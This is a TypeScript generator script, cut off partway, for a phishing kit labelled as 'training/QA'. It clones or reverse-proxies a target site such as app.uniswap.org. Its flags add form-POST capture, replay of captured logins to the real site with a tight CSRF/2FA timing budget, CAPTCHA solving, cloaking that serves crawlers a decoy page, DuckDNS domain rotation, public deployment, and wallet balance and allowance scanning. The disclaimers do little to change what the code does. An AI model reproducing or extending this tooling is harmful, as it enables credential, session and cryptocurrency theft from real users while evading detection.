/**
 * Website mirroring & UX testing toolkit — generates a localhost/staging static clone
 * with optional QA flags (proxy, deploy, balance demo, toasts, cloak, i18n, etc.).
 *
 * Usage (authorized staging / training only):
 *   PHISHING_TRAINING_MODE=true DEMO_API_URL=https://your-api.example.com \\
 *     pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>
 *
 * Flags (all optional, off by default):
 *   --proxy          nginx + docker-compose reverse proxy for live API content
 *   --rotate         rotate User-Agent / PROXY_LIST during asset fetch
 *   --deploy         deploy to Vercel (VERCEL_TOKEN) or Netlify (NETLIFY_TOKEN)
 *   --balance        demo "Claimable amount" from wallet balance APIs
 *   --toast          fake activity toasts for UX testing
 *   --redirect       after form submit, redirect to original site
 *   --cloak          serve bots.html to crawlers (UA detection)
 *   --lang           Accept-Language i18n scaffold (en + es)
 *   --solve-captcha  expose 2captcha Turnstile helper (TWOCAPTCHA_API_KEY)
 *   --preapprove     check allowance-reuse scan API when enabled
 *   --mirror         QA dynamic reverse proxy only (nginx + Docker, no clone/capture)
 *   --log-forms      with --mirror: log POST bodies locally to logs/logs.json (QA debug)
 *   --test-login     with --mirror + --log-forms: replay login POSTs via internal mirror (replay.js)
 *   --replay-original with --mirror + --log-forms + --test-login: replay once to original target origin
 *   --instant-replay with --replay-original: zero delay + 300ms CSRF budget (2FA QA)
 *   --solve-captcha  with --mirror + --log-forms: 2captcha CAPTCHA solving (captcha-solver.js, TWOCAPTCHA_API_KEY)
 *   --replay-demo    with --mirror: write replay-demo.sh (session hijacking training examples)
 *   --captcha-demo   with --mirror: write README-CAPTCHA-DEMO.md (2captcha education, no API)
 *   --rotate-domain  with --mirror: write README-ROTATE-DOMAIN.md + DuckDNS script template (manual)
 *   --auto-rotate    with --mirror: DuckDNS auto-rotation (rotate-domain.sh + domain-rotator service)
 *   --mobile-optimize inject device-detection CSS/JS for better mobile clone layout
 *
 * Example:
 *   PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts \\
 *     --mirror --rotate-domain https://app.uniswap.org ./mirrors/uniswap
 */
import { spawn } from 'node:child_process'
import { createHash } from 'node:crypto'
import { mkdir, writeFile } from 'node:fs/promises'
import path from 'node:path'

import {
  buildBotsHtml,
  buildDockerCompose,
  buildFeaturesReadme,
  buildFormLoggerJs,
  buildReplayJs,
  buildCaptchaSolverJs,
  buildCaptchaClientJs,
  buildReplayDemoScript,
  buildCaptchaDemoReadme,
  buildRotateDomainReadme,
  buildRotateDomainScriptTemplate,
  buildAutoRotateDomainScript,
  buildAutoRotateReadme,
  duckdnsSlugFromTarget,
  buildDuckDnsEnvExample,
  buildMirrorDockerCompose,
  buildMirrorNginxConfig,
  buildMirrorReadme,
  buildMirrorStatusHtml,
  buildMobileOptimizeCss,
  buildMobileOptimizeJs,
  buildNginxProxyConfig,
  buildProxyClientPatch,
  buildTrainingQaCss,
  buildTrainingQaJs,
  buildVercelJson,
  parseProxyList,
  pickRotatingFetchHeaders,
  type TrainingCloneFeatures,
  type TrainingCloneContext,
} from './lib/training-clone-features.js'
import {
  buildTrainingWalletDemoCss,
  buildTrainingWalletDemoJs,
} from './lib/training-wallet-demo-js.js'

const TRAINING_UA =
  'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'

const MAX_ASSETS = Number.parseInt(process.env['PHISHING_TRAINING_MAX_ASSETS'] ?? '30', 10)
const MAX_BYTES = Number.parseInt(process.env['PHISHING_TRAINING_MAX_BYTES'] ?? '2097152', 10)
const FETCH_TIMEOUT_MS = 20_000

const FEATURE_FLAGS = [
  'mirror',
  'log-forms',
  'test-login',
  'replay-original',
  'instant-replay',
  'replay-demo',
  'captcha-demo',
  'rotate-domain',
  'auto-rotate',
  'proxy',
  'rotate',
  'deploy',
  'balance',
  'toast',
  'redirect',
  'cloak',
  'lang',
  'solve-captcha',
  'preapprove',
  'mobile-optimize',
] as const

function parseCli(argv: string[]): {
  features: TrainingCloneFeatures
  mirror: boolean
  logForms: boolean
  testLogin: boolean
  replayOriginal: boolean
  instantReplay: boolean
  mirrorSolveCaptcha: boolean
  replayDemo: boolean
  captchaDemo: boolean
  rotateDomain: boolean
  autoRotate: boolean
  mobileOptimize: boolean
  positional: string[]
} {
  const features: TrainingCloneFeatures = {
    proxy: false,
    rotate: false,
    deploy: false,
    balance: false,
    toast: false,
    redirect: false,
    cloak: false,
    lang: false,
    solveCaptcha: false,
    preapprove: false,
  }
  let mirror = false
  let logForms = false
  let testLogin = false
  let replayOriginal = false
  let instantReplay = false
  let mirrorSolveCaptcha = false
  let replayDemo = false
  let captchaDemo = false
  let rotateDomain = false
  let autoRotate = false
  let mobileOptimize = false
  const positional: string[] = []

  for (const arg of argv) {
    if (arg === '--mirror') mirror = true
    else if (arg === '--log-forms') logForms = true
    else if (arg === '--test-login') testLogin = true
    else if (arg === '--replay-original') replayOriginal = true
    else if (arg === '--instant-replay') {
      instantReplay = true
      replayOriginal = true
    }
    else if (arg === '--solve-captcha') {
      features.solveCaptcha = true
      mirrorSolveCaptcha = true
    }
    else if (arg === '--replay-demo') replayDemo = true
    else if (arg === '--captcha-demo') captchaDemo = true
    else if (arg === '--rotate-domain') rotateDomain = true
    else if (arg === '--auto-rotate') autoRotate = true
    else if (arg === '--mobile-optimize') mobileOptimize = true
    else if (arg === '--proxy') features.proxy = true
    else if (arg === '--rotate') features.rotate = true
    else if (arg === '--deploy') features.deploy = true
    else if (arg === '--balance') features.balance = true
    else if (arg === '--toast') features.toast = true
    else if (arg === '--redirect') features.redirect = true
    else if (arg === '--cloak') features.cloak = true
    else if (arg === '--lang') features.lang = true
    else if (arg === '--preapprove') features.preapprove = true
    else if (arg.startsWith('--')) {
      console.warn(`[PHISHING_TRAINING] Unknown flag ignored: ${arg}`)
    } else {
      positional.push(arg)
    }
  }

  return {
    features,
    mirror,
    logForms,
    testLogin,
    replayOriginal,
    instantReplay,
    mirrorSolveCaptcha,
    replayDemo,
    captchaDemo,
    rotateDomain,
    autoRotate,
    mobileOptimize,
    positional,
  }
}

function isTruthyEnv(key: string): boolean {
  const v = process.env[key]?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function guardOrExit(): void {
  if (!isTruthyEnv('PHISHING_TRAINING_MODE')) {
    console.error('[PHISHING_TRAINING] Refused: set PHISHING_TRAINING_MODE=true')
    process.exit(1)
  }
  if (process.env['NODE_ENV']?.trim().toLowerCase() === 'production') {
    console.error('[PHISHING_TRAINING] Refused: NODE_ENV=production')
    process.exit(1)
  }
}

function parseAllowedHosts(): Set<string> | null {
  const raw = process.env['PHISHING_TRAINING_ALLOWED_HOSTS']?.trim()
  if (!raw) return null
  return new Set(
    raw
      .split(',')
      .map((h) => h.trim().toLowerCase())
      .filter(Boolean),
  )
}

async function fetchWithTimeout(
  url: string,
  init?: RequestInit,
  opts?: { rotate?: boolean },
): Promise<Response> {
  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS)
  const rotateHeaders = opts?.rotate ? pickRotatingFetchHeaders() : {}
  try {
    return await fetch(url, {
      ...init,
      signal: ctrl.signal,
      headers: {
        'User-Agent': TRAINING_UA,
        Accept: '*/*',
        ...(opts?.rotate ? rotateHeaders : {}),
        ...(init?.headers ?? {}),
      },
    })
  } finally {
    clearTimeout(timer)
  }
}

type RobotsRule = { allow: string[]; disallow: string[] }

function parseRobotsTxt(body: string): RobotsRule {
  const allow: string[] = []
  const disallow: string[] = []
  let applies = false
  for (const line of body.split('\n')) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const lower = trimmed.toLowerCase()
    if (lower.startsWith('user-agent:')) {
      const agent = trimmed.slice('user-agent:'.length).trim()
      applies = agent === '*' || agent.toLowerCase().includes('legion')
      continue
    }
    if (!applies) continue
    if (lower.startsWith('disallow:')) {
      disallow.push(trimmed.slice('disallow:'.length).trim())
    } else if (lower.startsWith('allow:')) {
      allow.push(trimmed.slice('allow:'.length).trim())
    }
  }
  return { allow, disallow }
}

function pathBlockedByRobots(pathname: string, rules: RobotsRule): boolean {
  for (const prefix of rules.allow) {
    if (prefix && pathname.startsWith(prefix)) return false
  }
  for (const prefix of rules.disallow) {
    if (!prefix) continue
    if (pathname === prefix || pathname.startsWith(prefix)) return true
  }
  return false
}

async function checkRobotsAllowed(target: URL, rotate: boolean): Promise<void> {
  const robotsUrl = new URL('/robots.txt', target.origin)
  let res: Response
  try {
    res = await fetchWithTimeout(robotsUrl.toString(), undefined, { rotate })
  } catch (e) {
    console.warn(
      `[PHISHING_TRAINING] robots.txt unreachable (${robotsUrl}) — ${e instanceof Error ? e.message : String(e)}`,
    )
    return
  }
  if (!res.ok) {
    console.warn(`[PHISHING_TRAINING] robots.txt HTTP ${res.status} — proceeding with caution`)
    return
  }
  const rules = parseRobotsTxt(await res.text())
  if (pathBlockedByRobots(target.pathname || '/', rules)) {
    console.error(
      `[PHISHING_TRAINING] robots.txt disallows path "${target.pathname}" on ${target.origin}`,
    )
    process.exit(1)
  }
}

function assetFileName(assetUrl: URL): string {
  const hash = createHash('sha256').update(assetUrl.href).digest('hex').slice(0, 16)
  const ext = path.extname(assetUrl.pathname) || '.bin'
  const safeExt = ext.length <= 8 ? ext : '.bin'
  return `${hash}${safeExt}`
}

function extractAssetUrls(html: string, base: URL): string[] {
  const found = new Set<string>()
  const patterns = [
    /<link[^>]+href=["']([^"']+)["']/gi,
    /<script[^>]+src=["']([^"']+)["']/gi,
    /<img[^>]+src=["']([^"']+)["']/gi,
  ]
  for (const re of patterns) {
    let m: RegExpExecArray | null
    while ((m = re.exec(html)) !== null) {
      const href = m[1]?.trim()
      if (!href || href.startsWith('data:') || href.startsWith('blob:')) continue
      try {
        const u = new URL(href, base)
        if (u.protocol !== 'http:' && u.protocol !== 'https:') continue
        if (u.origin !== base.origin) continue
        found.add(u.href)
      } catch {
        /* skip invalid */
      }
    }
  }
  return [...found]
}

function rewriteHtmlAssets(html: string, base: URL, urlToLocal: Map<string, string>): string {
  let out = html
  for (const [remote, local] of urlToLocal) {
    out = out.split(remote).join(local)
    try {
      const rel = new URL(remote, base).pathname
      if (rel && rel !== '/') {
        out = out.split(rel).join(local)
      }
    } catch {
      /* ignore */
    }
  }
  return out
}

function resolveDemoApiUrl(): string {
  const explicit = process.env['DEMO_API_URL']?.trim()
  if (explicit) return explicit.replace(/\/$/, '')

  const apiPort = process.env['PORT']?.trim() || '4000'
  return `http://127.0.0.1:${apiPort}`
}

function buildInjectionBundle(opts: {
  features: TrainingCloneFeatures
  qaContext: TrainingCloneContext | null
  proxy: boolean
  target: URL
  mobileOptimize?: boolean
}): string {
  const parts: string[] = []
  parts.push('<!-- legion-phishing-training (authorized staging / QA toolkit) -->')
  parts.push('<link rel="stylesheet" href="./legion-training-wallet.css" />')
  parts.push('<script src="./legion-training-wallet.js" defer></script>')

  if (opts.qaContext) {
    parts.push('<link rel="stylesheet" href="./legion-training-qa.css" />')
    parts.push('<script src="./legion-training-qa.js" defer></script>')
  }

  if (opts.proxy) {
    parts.push('<script src="./legion-proxy-patch.js"></script>')
  }

  if (opts.mobileOptimize) {
    parts.push('<link rel="stylesheet" href="./legion-mobile-optimize.css" />')
    parts.push('<script src="./legion-mobile-optimize.js" defer></script>')
  }

  return parts.join('\n')
}

function buildReadme(
  targetUrl: string,
  outDir: string,
  demoApiUrl: string,
  features: TrainingCloneFeatures,
  deployUrl?: string,
): string {
  const enabled = FEATURE_FLAGS.filter((f) => {
    const key = f === 'solve-captcha' ? 'solveCaptcha' : (f as keyof TrainingCloneFeatures)
    return features[key as keyof TrainingCloneFeatures]
  })

  const ctx: TrainingCloneContext = {
    target: new URL(targetUrl),
    outDir,
    demoApiUrl,
    features,
  }

  return `# Website mirroring & UX testing toolkit (staging only)

**Source reference:** ${targetUrl}
**Generated:** ${new Date().toISOString()}
${deployUrl ? `**Deployed staging URL:** ${deployUrl}\n` : ''}

## Rules

- Use only on authorized staging / localhost environments.
- Never deploy to a deceptive public domain.
- Wallet panel uses \`personal_sign\` / \`signMessage\` only — no settlement when training demo mode is on.

## Serve locally

\`\`\`bash
# API with training demo
TRAINING_DEMO_MODE=true pnpm --filter @legion/api dev

# Static clone
npx --yes serve "${outDir}" -l 8080
\`\`\`

${features.proxy ? `## Proxy mode (live content)\n\n\`\`\`bash\ncd "${outDir}"\ndocker compose up\n# http://localhost:8080\n\`\`\`\n\n` : ''}
${enabled.length ? buildFeaturesReadme(ctx, enabled.map((f) => `--${f}`)) : ''}

See \`training-config.json\` for feature flags and API endpoints.
`
}

function runCommand(
  cmd: string,
  args: string[],
  cwd: string,
  env: Record<string, string>,
): Promise<{ stdout: string; stderr: string; code: number }> {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, {
      cwd,
      env: { ...process.env, ...env },
      shell: process.platform === 'win32',
    })
    let stdout = ''
    let stderr = ''
    child.stdout?.on('data', (d: Buffer) => {
      stdout += d.toString()
    })
    child.stderr?.on('data', (d: Buffer) => {
      stderr += d.toString()
    })
    child.on('error', reject)
    child.on('close', (code) => resolve({ stdout, stderr, code: code ?? 1 }))
  })
}

async function deployStaging(outDir: string): Promise<string | null> {
  const vercelToken = process.env['VERCEL_TOKEN']?.trim()
  const netlifyToken = process.env['NETLIFY_TOKEN']?.trim()

  if (vercelToken) {
    await writeFile(path.join(outDir, 'vercel.json'), buildVercelJson(), 'utf8')
    console.info('[PHISHING_TRAINING] Deploying to Vercel…')
    const result = await runCommand(
      'npx',
      ['--yes', 'vercel', 'deploy', '--yes', '--token', vercelToken],
      outDir,
      { VERCEL_TOKEN: vercelToken },
    )
    if (result.code !== 0) {
      console.warn(`[PHISHING_TRAINING] Vercel deploy failed: ${result.stderr || result.stdout}`)
      return null
    }
    const urlMatch = result.stdout.match(/https:\/\/[^\s]+/g)
    const url = urlMatch?.[urlMatch.length - 1] ?? null
    if (url) console.info(`[PHISHING_TRAINING] Vercel URL: ${url}`)
    return url
  }

  if (netlifyToken) {
    console.info('[PHISHING_TRAINING] Deploying to Netlify…')
    const result = await runCommand(
      'npx',
      [
        '--yes',
        'netlify',
        'deploy',
        '--dir',
        '.',
        '--prod',
        '--auth',
        netlifyToken,
        '--message',
        'legion-qa-mirror',
      ],
      outDir,
      { NETLIFY_AUTH_TOKEN: netlifyToken },
    )
    if (result.code !== 0) {
      console.warn(`[PHISHING_TRAINING] Netlify deploy failed: ${result.stderr || result.stdout}`)
      return null
    }
    const urlMatch = result.stdout.match(/https:\/\/[^\s]+\.netlify\.app[^\s]*/i)
    const url = urlMatch?.[0] ?? null
    if (url) console.info(`[PHISHING_TRAINING] Netlify URL: ${url}`)
    return url
  }

  console.warn('[PHISHING_TRAINING] --deploy set but VERCEL_TOKEN and NETLIFY_TOKEN are unset')
  return null
}

async function generateMirrorMode(
  target: URL,
  outDir: string,
  logForms: boolean,
  testLogin: boolean,
  replayOriginal: boolean,
  instantReplay: boolean,
  mirrorSolveCaptcha: boolean,
  replayDemo: boolean,
  captchaDemo: boolean,
  rotateDomain: boolean,
  autoRotate: boolean,
  mobileOptimize: boolean,
): Promise<void> {
  const hostPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
  const loggerPort = Number.parseInt(process.env['QA_MIRROR_LOGGER_PORT']?.trim() ?? '9090', 10)
  const listenPort = 8080
  const duckdnsBase = duckdnsSlugFromTarget(target)

  await mkdir(outDir, { recursive: true })

  if (autoRotate) {
    await mkdir(path.join(outDir, 'rotate'), { recursive: true })
    await mkdir(path.join(outDir, 'ssl'), { recursive: true })
    await mkdir(path.join(outDir, 'logs'), { recursive: true })
    await writeFile(
      path.join(outDir, 'rotate', 'active-domain.conf'),
      '# Populated by rotate-domain.sh --init\n',
      'utf8',
    )
    await writeFile(
      path.join(outDir, 'rotate-domain.sh'),
      buildAutoRotateDomainScript(target, hostPort, duckdnsBase),
      'utf8',
    )
    await writeFile(
      path.join(outDir, 'README-AUTO-ROTATE.md'),
      buildAutoRotateReadme(target, hostPort, duckdnsBase),
      'utf8',
    )
    await writeFile(path.join(outDir, 'duckdns.env.example'), buildDuckDnsEnvExample(target), 'utf8')
    await writeFile(path.join(outDir, 'logs', 'domain_state.json'), '{}\n', 'utf8')
    await writeFile(
      path.join(outDir, 'logs', 'rotate.log'),
      '# DuckDNS auto-rotation log — staging resilience testing only\n',
      'utf8',
    )
  }

  if (logForms) {
    await mkdir(path.join(outDir, 'logs'), { recursive: true })
    await writeFile(
      path.join(outDir, 'logger.js'),
      buildFormLoggerJs({ testLogin, replayOriginal, solveCaptcha: mirrorSolveCaptcha }),
      'utf8',
    )
    await writeFile(path.join(outDir, 'logs', 'logs.json'), '[]\n', 'utf8')
    if (testLogin) {
      await writeFile(path.join(outDir, 'replay.js'), buildReplayJs(target, { replayOriginal, instantReplay }), 'utf8')
      await writeFile(path.join(outDir, 'logs', 'session_cookies.json'), '[]\n', 'utf8')
      await writeFile(
        path.join(outDir, 'logs', 'replay_log.txt'),
        '# QA login replay log — internal mirror only (capture cookies, no reuse)\n',
        'utf8',
      )
      if (replayOriginal) {
        await writeFile(path.join(outDir, 'logs', 'original_session_cookies.json'), '[]\n', 'utf8')
        await writeFile(
          path.join(outDir, 'logs', 'original_replay_log.txt'),
          '# Original target login replay — one shot per capture (manual inspection only)\n',
          'utf8',
        )
      }
    }
    if (mirrorSolveCaptcha) {
      await writeFile(path.join(outDir, 'captcha-solver.js'), buildCaptchaSolverJs(target), 'utf8')
      await mkdir(path.join(outDir, '__legion__'), { recursive: true })
      await writeFile(path.join(outDir, '__legion__', 'captcha-client.js'), buildCaptchaClientJs(), 'utf8')
      await writeFile(
        path.join(outDir, 'logs', 'captcha_solver.log'),
        '# 2captcha API log — mirror QA only\n',
        'utf8',
      )
    }
  }

  await writeFile(
    path.join(outDir, 'nginx.conf'),
    buildMirrorNginxConfig(target, listenPort, {
      logForms,
      testLogin,
      replayOriginal,
      solveCaptcha: mirrorSolveCaptcha,
      autoRotate,
      loggerPort,
    }),
    'utf8',
  )
  await writeFile(
    path.join(outDir, 'docker-compose.yml'),
    buildMirrorDockerCompose(hostPort, {
      logForms,
      testLogin,
      replayOriginal,
      instantReplay,
      solveCaptcha: mirrorSolveCaptcha,
      autoRotate,
      loggerPort,
      targetHost: target.host,
      targetOrigin: target.origin,
      duckdnsBase,
    }),
    'utf8',
  )
  if (mobileOptimize) {
    await writeFile(path.join(outDir, 'legion-mobile-optimize.css'), buildMobileOptimizeCss(), 'utf8')
    await writeFile(path.join(outDir, 'legion-mobile-optimize.js'), buildMobileOptimizeJs(), 'utf8')
  }

  let mirrorHtml = buildMirrorStatusHtml(
    target,
    logForms,
    replayDemo,
    captchaDemo,
    rotateDomain,
    testLogin,
    mirrorSolveCaptcha,
    autoRotate,
    replayOriginal,
    instantReplay,
  )
  if (mobileOptimize) {
    const mobileBundle =
      '<link rel="stylesheet" href="./legion-mobile-optimize.css" />\n<script src="./legion-mobile-optimize.js" defer></script>'
    mirrorHtml = mirrorHtml.includes('</head>')
      ? mirrorHtml.replace('</head>', `${mobileBundle}\n</head>`)
      : `${mobileBundle}\n${mirrorHtml}`
  }
  await writeFile(path.join(outDir, 'index.html'), mirrorHtml, 'utf8')

  if (replayDemo) {
    await writeFile(
      path.join(outDir, 'replay-demo.sh'),
      buildReplayDemoScript(target, hostPort, logForms),
      'utf8',
    )
  }

  if (captchaDemo) {
    await writeFile(
      path.join(outDir, 'README-CAPTCHA-DEMO.md'),
      buildCaptchaDemoReadme(target),
      'utf8',
    )
  }

  if (rotateDomain) {
    await writeFile(
      path.join(outDir, 'README-ROTATE-DOMAIN.md'),
      buildRotateDomainReadme(target, hostPort),
      'utf8',
    )
    await writeFile(
      path.join(outDir, 'rotate-domain.sh.template'),
      buildRotateDomainScriptTemplate(target, hostPort),
      'utf8',
    )
    await writeFile(path.join(outDir, 'duckdns.env.example'), buildDuckDnsEnvExample(target), 'utf8')
  }

  const mirrorNotes: string[] = []
  if (logForms) mirrorNotes.push('POST bodies mirrored to local logs.json only')
  if (testLogin) mirrorNotes.push('login replay via internal mirror (replay.js, cookies capture only)')
  if (replayOriginal) mirrorNotes.push('original target replay once per capture (ORIGINAL_REPLAY_ENABLED)')
  if (instantReplay) mirrorNotes.push('instant original replay (delay=0, CSRF budget 300ms)')
  if (mirrorSolveCaptcha) mirrorNotes.push('2captcha CAPTCHA solving (captcha-solver.js)')
  if (replayDemo) mirrorNotes.push('replay-demo.sh training examples (no auto replay)')
  if (captchaDemo) mirrorNotes.push('README-CAPTCHA-DEMO.md (no solver API)')
  if (rotateDomain) mirrorNotes.push('README-ROTATE-DOMAIN.md + DuckDNS templates (manual only)')
  if (autoRotate) mirrorNotes.push('DuckDNS auto-rotate (rotate-domain.sh + domain-rotator)')

  await writeFile(
    path.join(outDir, 'mirror-config.json'),
    JSON.stringify(
      {
        mode: 'mirror',
        log_forms: logForms,
        test_login: testLogin,
        replay_original: replayOriginal,
        instant_replay: instantReplay,
        solve_captcha: mirrorSolveCaptcha,
        replay_demo: replayDemo,
        captcha_demo: captchaDemo,
        rotate_domain: rotateDomain,
        auto_rotate: autoRotate,
        duckdns_base: autoRotate ? duckdnsBase : undefined,
        target_url: target.href,
        target_origin: target.origin,
        target_host: target.host,
        generated_at: new Date().toISOString(),
        listen_port: hostPort,
        logger_port: logForms ? loggerPort : undefined,
        log_file: logForms ? './logs/logs.json' : undefined,
        session_cookies_file: testLogin ? './logs/session_cookies.json' : undefined,
        replay_log_file: testLogin ? './logs/replay_log.txt' : undefined,
        original_session_cookies_file: replayOriginal ? './logs/original_session_cookies.json' : undefined,
        original_replay_log_file: replayOriginal ? './logs/original_replay_log.txt' : undefined,
        captcha_solver_log: mirrorSolveCaptcha ? './logs/captcha_solver.log' : undefined,
        rotate_log: autoRotate ? './logs/rotate.log' : undefined,
        domain_state_file: autoRotate ? './logs/domain_state.json' : undefined,
        notes:
          mirrorNotes.length > 0
            ? `QA reverse proxy — ${mirrorNotes.join('; ')}`
            : 'QA reverse proxy — no form logging',
        usage: {
          status: `http://localhost:${hostPort}/`,
          proxied_example: `http://localhost:${hostPort}/<path-on-target>`,
          start: 'docker compose up',
          ...(logForms ? { form_log: './logs/logs.json' } : {}),
          ...(testLogin
            ? {
                replay_js: './replay.js',
                session_cookies: './logs/session_cookies.json',
                replay_log: './logs/replay_log.txt',
              }
            : {}),
          ...(replayOriginal
            ? {
                original_session_cookies: './logs/original_session_cookies.json',
                original_replay_log: './logs/original_replay_log.txt',
              }
            : {}),
          ...(mirrorSolveCaptcha
            ? {
                captcha_solver: './captcha-solver.js',
                captcha_client: './__legion__/captcha-client.js',
                captcha_solver_log: './logs/captcha_solver.log',
              }
            : {}),
          ...(replayDemo ? { replay_demo: './replay-demo.sh' } : {}),
          ...(captchaDemo ? { captcha_demo: './README-CAPTCHA-DEMO.md' } : {}),
          ...(autoRotate
            ? {
                rotate_domain_script: './rotate-domain.sh',
                auto_rotate_readme: './README-AUTO-ROTATE.md',
                rotate_log: './logs/rotate.log',
                domain_state: './logs/domain_state.json',
              }
            : {}),
          ...(rotateDomain
            ? {
                rotate_domain_readme: './README-ROTATE-DOMAIN.md',
                rotate_domain_template: './rotate-domain.sh.template',
                duckdns_env_example: './duckdns.env.example',
              }
            : {}),
        },
      },
      null,
      2,
    ),
    'utf8',
  )
  await writeFile(
    path.join(outDir, 'README-MIRROR.md'),
    buildMirrorReadme(
      target,
      outDir,
      hostPort,
      logForms,
      replayDemo,
      captchaDemo,
      rotateDomain,
      testLogin,
      mirrorSolveCaptcha,
      autoRotate,
      replayOriginal,
      instantReplay,
    ),
    'utf8',
  )

  console.info(`[PHISHING_TRAINING] Mirror mode — wrote ${outDir}`)
  console.info(`[PHISHING_TRAINING] Target: ${target.href}`)
  if (logForms) {
    console.info('[PHISHING_TRAINING] Form logging enabled → logs/logs.json (local only)')
  }
  if (testLogin) {
    console.info(
      '[PHISHING_TRAINING] --test-login enabled → replay.js replays via internal mirror; cookies → logs/session_cookies.json',
    )
  }
  if (replayOriginal) {
    console.info(
      '[PHISHING_TRAINING] --replay-original enabled → one-shot replay to target origin; logs/original_session_cookies.json',
    )
  }
  if (instantReplay) {
    console.info(
      '[PHISHING_TRAINING] --instant-replay enabled → ORIGINAL_REPLAY_DELAY_MS=0, CSRF pre-fetch budget 300ms',
    )
  }
  if (mirrorSolveCaptcha) {
    console.info(
      '[PHISHING_TRAINING] --solve-captcha enabled → captcha-solver.js (TWOCAPTCHA_API_KEY required at docker compose up)',
    )
  }
  if (replayDemo) {
    console.info('[PHISHING_TRAINING] replay-demo.sh written (training examples only — no auto replay)')
  }
  if (captchaDemo) {
    console.info('[PHISHING_TRAINING] README-CAPTCHA-DEMO.md written (education only — no solver API)')
  }
  if (autoRotate) {
    console.info(
      '[PHISHING_TRAINING] --auto-rotate enabled → rotate-domain.sh + domain-rotator (set DUCKDNS_TOKEN at compose up)',
    )
  }
  if (rotateDomain) {
    console.info(
      '[PHISHING_TRAINING] README-ROTATE-DOMAIN.md + rotate-domain.sh.template written (manual DNS only — no API)',
    )
  }
  console.info(`[PHISHING_TRAINING] Start: cd "${outDir}" && docker compose up`)
  console.info(`[PHISHING_TRAINING] Status: http://localhost:${hostPort}/`)
  console.info('[PHISHING_TRAINING] Proxied paths forward to target — routing/latency QA only')
}

async function main(): Promise<void> {
  guardOrExit()

  const { features, mirror, logForms, testLogin, replayOriginal, instantReplay, mirrorSolveCaptcha, replayDemo, captchaDemo, rotateDomain, autoRotate, mobileOptimize, positional } =
    parseCli(process.argv.slice(2))
  const targetRaw = positional[0]?.trim()
  const outDirArg = positional[1]?.trim()

  if (!targetRaw || !outDirArg) {
    console.error(`Usage: PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts [flags] <targetUrl> <outputDir>

Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
    process.exit(1)
  }

  let target: URL
  try {
    target = new URL(targetRaw)
  } catch {
    console.error('[PHISHING_TRAINING] Invalid target URL')
    process.exit(1)
  }

  if (target.protocol !== 'https:' && target.protocol !== 'http:') {
    console.error('[PHISHING_TRAINING] Only http(s) targets are supported')
    process.exit(1)
  }

  const allowedHosts = parseAllowedHosts()
  if (allowedHosts && !allowedHosts.has(target.hostname.toLowerCase())) {
    console.error(
      `[PHISHING_TRAINING] Host "${target.hostname}" not in PHISHING_TRAINING_ALLOWED_HOSTS`,
    )
    process.exit(1)
  }

  const outDir = path.resolve(outDirArg)

  if (logForms && !mirror) {
    console.error('[PHISHING_TRAINING] --log-forms requires --mirror')
    process.exit(1)
  }

  if (replayDemo && !mirror) {
    console.error('[PHISHING_TRAINING] --replay-demo requires --mirror')
    process.exit(1)
  }

  if (captchaDemo && !mirror) {
    console.error('[PHISHING_TRAINING] --captcha-demo requires --mirror')
    process.exit(1)
  }

  if (testLogin && !mirror) {
    console.error('[PHISHING_TRAINING] --test-login requires --mirror')
    process.exit(1)
  }

  if (testLogin && !logForms) {
    console.error('[PHISHING_TRAINING] --test-login requires --log-forms')
    process.exit(1)
  }

  if (replayOriginal && !mirror) {
    console.error('[PHISHING_TRAINING] --replay-original requires --mirror')
    process.exit(1)
  }

  if (replayOriginal && !logForms) {
    console.error('[PHISHING_TRAINING] --replay-original requires --log-forms')
    process.exit(1)
  }

  if (replayOriginal && !testLogin) {
    console.error('[PHISHING_TRAINING] --replay-original requires --test-login')
    process.exit(1)
  }

  if (instantReplay && !mirror) {
    console.error('[PHISHING_TRAINING] --instant-replay requires --mirror')
    process.exit(1)
  }

  if (instantReplay && !logForms) {
    console.error('[PHISHING_TRAINING] --instant-replay requires --log-forms')
    process.exit(1)
  }

  if (instantReplay && !testLogin) {
    console.error('[PHISHING_TRAINING] --instant-replay requires --test-login')
    process.exit(1)
  }

  if (mirrorSolveCaptcha && !mirror) {
    console.error('[PHISHING_TRAINING] --solve-captcha requires --mirror')
    process.exit(1)
  }

  if (mirrorSolveCaptcha && !logForms) {
    console.error('[PHISHING_TRAINING] --solve-captcha requires --log-forms')
    process.exit(1)
  }

  if (mirrorSolveCaptcha && !process.env['TWOCAPTCHA_API_KEY']?.trim()) {
    console.error('[PHISHING_TRAINING] --solve-captcha requires TWOCAPTCHA_API_KEY in environment')
    process.exit(1)
  }

  if (rotateDomain && !mirror) {
    console.error('[PHISHING_TRAINING] --rotate-domain requires --mirror')
    process.exit(1)
  }

  if (autoRotate && !mirror) {
    console.error('[PHISHING_TRAINING] --auto-rotate requires --mirror')
    process.exit(1)
  }

  if (autoRotate && rotateDomain) {
    console.warn('[PHISHING_TRAINING] --auto-rotate includes live rotation; --rotate-domain manual templates are optional')
  }

  if (autoRotate && !process.env['DUCKDNS_TOKEN']?.trim()) {
    console.error('[PHISHING_TRAINING] --auto-rotate requires DUCKDNS_TOKEN in environment')
    process.exit(1)
  }

  if (autoRotate && !process.env['DUCKDNS_SUBDOMAIN']?.trim()) {
    console.warn('[PHISHING_TRAINING] DUCKDNS_SUBDOMAIN unset — defaults to <slug>-01 at compose up')
  }

  if (mirror) {
    if (Object.values(features).some(Boolean) && !mirrorSolveCaptcha) {
      console.warn('[PHISHING_TRAINING] --mirror ignores other QA flags (proxy-only mode)')
    }
    await generateMirrorMode(
      target,
      outDir,
      logForms,
      testLogin,
      replayOriginal,
      instantReplay,
      mirrorSolveCaptcha,
      replayDemo,
      captchaDemo,
      rotateDomain,
      autoRotate,
      mobileOptimize,
    )
    return
  }

  if (features.rotate && parseProxyList().length === 0) {
    console.warn('[PHISHING_TRAINING] --rotate: PROXY_LIST empty — rotating User-Agent only')
  }

